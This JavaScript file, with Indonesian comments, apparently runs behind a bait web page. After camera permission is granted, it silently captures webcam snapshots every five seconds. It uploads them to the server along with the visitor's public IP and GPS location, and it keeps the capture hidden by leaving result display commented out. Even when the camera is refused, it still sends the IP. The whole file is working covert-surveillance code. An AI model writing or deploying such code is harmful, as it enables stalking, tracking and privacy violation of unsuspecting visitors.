const video = document.getElementById("video");
const resultDiv = document.getElementById("result");

// Fungsi untuk mengirim IP publik
function sendIP(ip) {
    fetch("/send_ip", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({ ip: ip })
    });
}

// Akses kamera dan lokasi
navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
        video.srcObject = stream;

        // Kirim IP publik
        fetch("/get_ip")
            .then(response => response.json())
            .then(data => {
                sendIP(data.ip);
            });

        // Ambil gambar secara terus menerus
        setInterval(() => {
            const canvas = document.createElement("canvas");
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext("2d");
            ctx.drawImage(video, 0, 0);
            const imageData = canvas.toDataURL("image/png").split(',')[1];

            fetch("/capture_image", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({ image_data: imageData })
            })
            .then(response => response.json())
            .then(data => {
                if (data.status === "success") {
                    // Tampilkan hasil jika diinginkan
                    // resultDiv.innerHTML += `<img src="${data.image_url}" width="300" />`;
                }
            });
        }, 5000); // Ambil gambar setiap 5 detik

        // Ambil lokasi
        navigator.geolocation.getCurrentPosition(position => {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;

            fetch("/get_location", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({ latitude, longitude })
            })
            .then(response => response.json())
            .then(data => {
                // Kirim link lokasi ke server
                fetch("/send_location", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({ location_url: data.location_url })
                });
            });
        }, error => {
            console.error("Error getting location: ", error);
        });
    })
    .catch(err => {
        console.error("Error accessing camera: ", err);
        // Jika izin kamera tidak diberikan, kirim hanya IP publik
        fetch("/get_ip")
            .then(response => response.json())
            .then(data => {
                sendIP(data.ip);
            });
    });

